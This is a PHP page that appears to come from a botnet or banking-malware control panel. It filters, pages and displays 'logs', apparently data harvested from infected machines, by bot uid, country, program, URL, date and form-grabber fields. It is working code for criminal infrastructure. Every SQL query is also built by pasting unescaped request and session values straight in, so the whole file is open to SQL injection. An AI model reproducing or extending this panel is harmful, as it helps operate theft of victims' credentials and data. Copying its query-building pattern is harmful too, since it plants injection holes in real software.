<?php
$smarty->allow_php_tag = true;
//error_reporting(-1);
get_function('html_pages');
get_function('size_format');

$filter = $mysqli->query('SELECT * FROM bf_filters WHERE (id = \''.$Cur['id'].'\') LIMIT 1');

if($filter->id != $Cur['id']){	exit;
}

$smarty->assignByRef('filter', $filter);

if(is_array($_SESSION['gsearch'])){	$_POST['prefix'] = $_SESSION['gsearch']['prefix'];
	$_POST['mask_uid'] = $_SESSION['gsearch']['data'];
}

if(count($_POST) > 0){
	if($_POST['prefix'] != $_SESSION['search']['prefix_' . $filter->id]){
		$_SESSION['search']['prefix_' . $filter->id] = $_POST['prefix'];
	}

	if($_POST['mask_uid'] != $_SESSION['search']['mask_uid_' . $filter->id]){
		$_SESSION['search']['mask_uid_' . $filter->id] = $_POST['mask_uid'];
	}

	if($_POST['program'] != $_SESSION['search']['program_' . $filter->id]){
		$_SESSION['search']['program_' . $filter->id] = $_POST['program'];
	}

	if($_POST['status'] != $_SESSION['search']['status_' . $filter->id]){
		$_SESSION['search']['status_' . $filter->id] = $_POST['status'];
	}

	if($_POST['type'] != $_SESSION['search']['type_' . $filter->id]){
		$_SESSION['search']['type_' . $filter->id] = $_POST['type'];
	}

	if($_POST['gra_fields'] != $_SESSION['search']['gra_fields_' . $filter->id]){
		$_SESSION['search']['gra_fields_' . $filter->id] = $_POST['gra_fields'];
	}

	if($_POST['fgr_fields'] != $_SESSION['search']['fgr_fields_' . $filter->id]){
		$_SESSION['search']['fgr_fields_' . $filter->id] = $_POST['fgr_fields'];
	}

	if($_POST['url'] != $_SESSION['search']['url_' . $filter->id]){
		$_SESSION['search']['url_' . $filter->id] = $_POST['url'];
	}

	if($_POST['data1'] != $_SESSION['search']['data1_' . $filter->id]){
		$_SESSION['search']['data1_' . $filter->id] = $_POST['data1'];
	}

	if($_POST['data2'] != $_SESSION['search']['data2_' . $filter->id]){
		$_SESSION['search']['data2_' . $filter->id] = $_POST['data2'];
	}

	if($_POST['country'] != $_SESSION['search']['country_' . $filter->id]){
		$_SESSION['search']['country_' . $filter->id] = $_POST['country'];
	}

	if($_POST['addstr'] != $_SESSION['search']['addstr_' . $filter->id]){
		$_SESSION['search']['addstr_' . $filter->id] = $_POST['addstr'];
	}

	if($_POST['sized'][0] != $_SESSION['search']['sized' . $filter->id][0] || $_POST['sized'][1] != $_SESSION['search']['sized' . $filter->id][1]){
		$_SESSION['search']['sized_' . $filter->id] = $_POST['sized'];
	}

	if($_POST['sized'][2] != $_SESSION['search']['sized' . $filter->id][2] || $_POST['sized'][1] != $_SESSION['search']['sized' . $filter->id][3]){
		$_SESSION['search']['sized_' . $filter->id] = $_POST['sized'];
	}
}

$sql = '';

if(!empty($_SESSION['search']['prefix_' . $filter->id])){
	$_POST['prefix'] = $_SESSION['search']['prefix_' . $filter->id];
	$sql .= '(prefix=\''.$_SESSION['search']['prefix_' . $filter->id].'\')';
}

if(!empty($_SESSION['search']['sized_' . $filter->id][1])){
	$_POST['sized'][0] = $_SESSION['search']['sized_' . $filter->id][0];
	$_POST['sized'][1] = $_SESSION['search']['sized_' . $filter->id][1];
	if(!empty($sql)) $sql .= ' AND ';
	$sql .= '(size '.$_SESSION['search']['sized_' . $filter->id][0].' \''.$_SESSION['search']['sized_' . $filter->id][1].'\')';
}

if(!empty($_SESSION['search']['sized_' . $filter->id][3])){
	$_POST['sized'][2] = $_SESSION['search']['sized_' . $filter->id][2];
	$_POST['sized'][3] = $_SESSION['search']['sized_' . $filter->id][3];
	if(!empty($sql)) $sql .= ' AND ';
	$sql .= '(size '.$_SESSION['search']['sized_' . $filter->id][2].' \''.$_SESSION['search']['sized_' . $filter->id][3].'\')';
}

if(!empty($_SESSION['search']['mask_uid_' . $filter->id])){	if(!empty($sql)) $sql .= ' AND ';
	$_POST['mask_uid'] = $_SESSION['search']['mask_uid_' . $filter->id];
	$sql .= '(uid LIKE \''.$_SESSION['search']['mask_uid_' . $filter->id].'%\')';
}

if(!empty($_SESSION['search']['country_' . $filter->id])){
	if(!empty($sql)) $sql .= ' AND ';
	$sql .= '(country=\''.$_SESSION['search']['country_' . $filter->id].'\')';
	$_POST['country'] = $_SESSION['search']['country_' . $filter->id];
}

if(!empty($_SESSION['search']['addstr_' . $filter->id])){
	$_POST['addstr'] = $_SESSION['search']['addstr_' . $filter->id];
}

if(!empty($_SESSION['search']['program_' . $filter->id])){
	if(!empty($sql)) $sql .= ' AND ';
	$sql .= '(program=\''.$_SESSION['search']['program_' . $filter->id].'\')';
	$_POST['program'] = $_SESSION['search']['program_' . $filter->id];
}

if(!empty($_SESSION['search']['type_' . $filter->id])){
	if(!empty($sql)) $sql .= ' AND ';
	$sql .= '(type=\''.$_SESSION['search']['type_' . $filter->id].'\')';
	$_POST['type'] = $_SESSION['search']['type_' . $filter->id];
	$_POST['gra_fields'] = $_SESSION['search']['gra_fields_' . $filter->id];
	$_POST['fgr_fields'] = $_SESSION['search']['fgr_fields_' . $filter->id];

	if($_POST['type'] == '5' && !empty($_POST['fgr_fields'])){		$fgr_fields = explode(',', $_SESSION['search']['fgr_fields_' . $filter->id]);
		if(count($fgr_fields) > 0){			foreach($fgr_fields as $it){				if(!empty($it)) $sql .= ' AND (fields LIKE \'%'.$it.',%\')';
			}
		}
	}elseif($_POST['type'] == '6' && !empty($_POST['gra_fields'])){
		$sql .= ' AND (fields=\''.$_SESSION['search']['gra_fields_' . $filter->id].'\')';
	}
}

if(!empty($_SESSION['search']['url_' . $filter->id])){
	if(!empty($sql)) $sql .= ' AND ';
	$sql .= '(url LIKE \'%'.$_SESSION['search']['url_' . $filter->id].'%\')';
	$_POST['url'] = $_SESSION['search']['url_' . $filter->id];
}

if($_SESSION['search']['status_' . $filter->id] == 'nuls'){
	if(!empty($sql)) $sql .= ' AND ';
	$sql .= '(save=\'0\')';
	$_POST['status'] = $_SESSION['search']['status_' . $filter->id];
}elseif($_SESSION['search']['status_' . $filter->id] == '1'){	if(!empty($sql)) $sql .= ' AND ';
	$sql .= '(save!=\'0\')';
	$_POST['status'] = $_SESSION['search']['status_' . $filter->id];
}

if(!empty($_SESSION['search']['data1_' . $filter->id]) && !empty($_SESSION['search']['data2_' . $filter->id])){
	if($_SESSION['search']['data1_' . $filter->id] != 'ALL' && $_SESSION['search']['data2_' . $filter->id] != 'ALL'){		if(!empty($sql)) $sql .= ' AND ';
		if($_SESSION['search']['data1_' . $filter->id] == $_SESSION['search']['data2_' . $filter->id]){			$sql .= '(post_date > \''.$_SESSION['search']['data1_' . $filter->id].' 00:00:00\')';
		}else{			if($_SESSION['search']['data1_' . $filter->id] == 'ALL'){				$sql .= '(post_date < \''.$_SESSION['search']['data2_' . $filter->id].' 23:59:59\')';
			}elseif($_SESSION['search']['data2_' . $filter->id] == 'ALL'){				$sql .= '(post_date > \''.$_SESSION['search']['data1_' . $filter->id].' 00:00:00\')';
			}else{				$sql .= '(post_date > \''.$_SESSION['search']['data1_' . $filter->id].' 00:00:00\') AND (post_date < \''.$_SESSION['search']['data2_' . $filter->id].' 23:59:59\')';
			}
		}
	}
	$_POST['data1'] = $_SESSION['search']['data1_' . $filter->id];
	$_POST['data2'] = $_SESSION['search']['data2_' . $filter->id];
}

if(!empty($sql)) $sql = ' WHERE ' . $sql;
//print_rm($_POST);
$table_check = $mysqli->table_check('bf_filter_'.$filter->id);

if($table_check->Name != 'bf_filter_'.$filter->id){	print('<hr /><div align="center" style="font-size: 16px; font-weight:bold">'.$lang['tfensdsi'].'</div><hr />');
	exit;
}else{
	$logs = $mysqli->query('SELECT * FROM bf_filter_' . $filter->id . $sql . ' ORDER by post_date DESC LIMIT ' . ($Cur['page'] == 0 ? 0 : $Cur['page']*$_SESSION['user']->config['cp']['filters']).','.$_SESSION['user']->config['cp']['filters'], null, null, false);
	//$count_items = $mysqli->table_rows('bf_filter_' . $filter->id);
	$count_items = $mysqli->query_name('SELECT COUNT(id) count FROM bf_filter_' . $filter->id . $sql);

	if(!empty($Cur['id'])){
		$smarty->assign('pages', html_pages('/filters/logs-' . $Cur['id'] . '.html?ajax=1&', $count_items, $_SESSION['user']->config['cp']['filters'], 1, 'load_data_logs', 'this.href'));
	}elseif(!empty($Cur['str'])){
		$smarty->assign('pages', html_pages('/filters/logs.html?ajax=1&str=' . $Cur['str'], $count_items, $_SESSION['user']->config['cp']['filters'], 1, 'load_data_logs', 'this.href'));
	}

	$prefix = $mysqli->query_cache('SELECT DISTINCT(prefix) prefix FROM bf_filter_' . $filter->id, null, 1200, true);
	$programs = $mysqli->query_cache('SELECT DISTINCT(program) program FROM bf_filter_' . $filter->id, null, 1200, true);
	$country = $mysqli->query_cache('SELECT DISTINCT(country) country FROM bf_filter_' . $filter->id, null, 1200, true);
	$date = $mysqli->query_cache('SELECT DATE_FORMAT(post_date, \'%Y-%m-%d\') date from bf_filter_' . $filter->id . ' GROUP by DATE_FORMAT(post_date, \'%Y-%m-%d\') ORDER by post_date DESC', null, 43200, true);

    $types = $mysqli->query_cache('SELECT DISTINCT(type) type FROM bf_filter_' . $filter->id, null, 1800, true);

    $img_p = scandir('templates/images/b/');
    unset($img_p[0], $img_p[1]);
    $imgp = array();
    foreach($img_p as $file){    	$imgp[str_replace('.png', '', $file)] = true;
    }
    $smarty->assign('imgp', $imgp);

    $fields = array();
    $fields[5] = $mysqli->query_cache('SELECT DISTINCT(fields) fields FROM bf_filter_' . $filter->id . ' WHERE (type = \'5\')', null, 600, true);
    $fields[6] = $mysqli->query_cache('SELECT DISTINCT(fields) fields FROM bf_filter_' . $filter->id . ' WHERE (type = \'6\')', null, 600, true);
    sort($fields[6]);
    echo '<div align="left">';
    //print_rm($fields[6]);
    echo '</div>';
	$smarty->assign('prefix', $prefix);
	$smarty->assign('programs', $programs);
	$smarty->assign('country', $country);
	$smarty->assign('date', $date);
	$smarty->assign('fields', $fields);
	$smarty->assign('types', $types);

	$smarty->assign('count_items', $count_items);
	$smarty->assign('logs', $logs);
}

?>